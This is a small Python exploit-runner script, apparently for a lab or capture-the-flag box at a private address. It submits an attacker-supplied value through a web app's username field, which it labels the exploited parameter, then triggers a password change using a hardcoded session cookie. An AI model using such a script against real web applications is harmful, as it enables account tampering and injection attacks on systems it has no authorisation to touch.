#!/usr/bin/env python3

import requests
import argparse

parser = argparse.ArgumentParser('Experiment Runner')
parser.add_argument("--ip", type=str, default="10.10.72.11", help="Server ip")
parser.add_argument("--session_id", type=str, default="43ms4o2sedrgv2g3jtc259u3og", help="Session Id")
parser.add_argument("--name", type=str, required=True, help="Name to be set (Exploited parameter)")
parser.add_argument("--current_password", type=str, default="password", help="Current password")
parser.add_argument("--new_password", type=str, default="password", help="New password")
parser.add_argument("--name_only", action="store_true", help="Won't change the account password")

# TODO : Create account so we don't have to supply session id ?

def change_name(args):
    req_data = {
        "username":args.name,
        "country":"Afghanistan",
        "email":"user@pwn.com",
        "birthday":"2020-11-02",
        "description":""
    }

    cookie = {'PHPSESSID': args.session_id}

    print(f"Changing username to {args.name}")

    r = requests.post(f"http://{args.ip}/", data=req_data, cookies=cookie)

    if ' <span class="help-block"></span>' not in r.text:
        print("Error while changing name :")
        print(r.text.split('<div class="error has-error">')[-1].split('</div>')[0])
        #print(r.text)
        return False

    return True


def change_password(args):
    req_data = {
        'password': args.current_password,
        'new_password': args.new_password
    }
    cookie = {'PHPSESSID': args.session_id}

    print("Changing password")

    r = requests.post(f"http://{args.ip}/change/", data=req_data, cookies=cookie)
    
    # Hacky way of carving out the data
    status = r.text.split('<div class="alert')[-1].split('<form ')[0]

    #print(r.text)

    if "successfully" in status:
        print("Password changed")
        return True
    else:
        print("There was a problem")
        print(status)
        return False


if __name__ == "__main__":
    args = parser.parse_args()
    if change_name(args) and not args.name_only:
        change_password(args)